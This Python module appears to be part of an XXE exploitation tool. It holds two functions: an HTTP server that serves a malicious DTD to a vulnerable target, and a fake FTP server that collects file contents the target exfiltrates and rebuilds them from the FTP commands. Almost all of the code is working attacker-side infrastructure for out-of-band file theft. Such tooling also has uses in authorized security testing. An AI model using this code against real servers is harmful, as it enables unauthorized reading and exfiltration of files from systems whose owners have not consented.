import socket
from lib.utils import *


# simulate HTTP server for providing evil DTD
def http_server(addr, port, dtd, thread_mode=False):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.bind((addr, port))
		s.listen(1)
	except Exception as e:
		# if started in thread mode and address is already in use, the server is already running in another thread, no need to start another one
		if thread_mode and type(e).__name__ == 'OSError':
			return
		if not common_bind_exception(e, addr, port):
			print('[X] Exception "{}" encountered while starting HTTP server on port {}\n[-] Exiting'.format(type(e).__name__, port))
			exit(1)

	print('[*] HTTP server listening on port {}...'.format(port))

	conn, addr = s.accept()
	print('[+] HTTP connection received')

	# simulate an HTTP response for providing evil DTD and send it back to vulnerable server
	conn.sendall('HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}'.format(len(dtd), dtd).encode())

	conn.close()
	s.close()


# simulate FTP server for exfiltrate file content from vulnerable server
def ftp_server(addr, port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.bind((addr, port))
		s.settimeout(0.5)
		s.listen(1)
	except Exception as e:
		if not common_bind_exception(e, addr, port):
			print('[X] Exception "{}" encountered while starting FTP server on port {}\n[-] Exiting'.format(type(e).__name__, port))
			exit(1)

	print('[*] FTP server listening on port {}...'.format(port))

	try:
		conn, addr = s.accept()
	# timeout reached, server will never connect to FTP server, which means that it's not possible to exfiltrate file content (probably file does not exist or permission denied)
	except socket.timeout:
		s.close()
		return False

	conn.settimeout(1)
	print('[+] FTP connection received')

	conn.sendall('220 FTP\r\n'.encode())

	content = []

	while True:
		try:
			data = conn.recv(1024).decode()

			if data.startswith('USER'):
				conn.sendall('331 Username ok, send password\r\n'.encode())
				continue

			try:
				conn.sendall('230 more data please\r\n'.encode())
			except (BrokenPipeError, ConnectionResetError):
				raise socket.timeout

			# parse every FTP command the vulnerable server is sending
			content.append(parse_ftp(data))

		# timeout reached: end of file content, close connection and return it
		except socket.timeout:
			s.close()
			conn.close()
			return '/'.join([x for x in content if x])